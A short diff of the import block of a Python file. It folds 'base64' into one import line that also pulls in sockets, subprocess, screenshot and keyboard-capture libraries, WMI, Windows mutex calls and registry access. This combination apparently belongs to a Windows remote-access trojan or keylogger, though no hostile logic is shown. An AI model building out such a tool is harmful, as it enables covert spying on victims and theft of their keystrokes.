@@ -1,5 +1,4 @@
-import base64
-import socket, os, sys, platform, time, ctypes, subprocess, pyscreeze, threading, pynput.keyboard, wmi, json
+import socket, os, sys, platform, time, ctypes, subprocess, pyscreeze, threading, pynput.keyboard, wmi, json, base64
 import win32api, winerror, win32event
 from shutil import copyfile
 from winreg import *
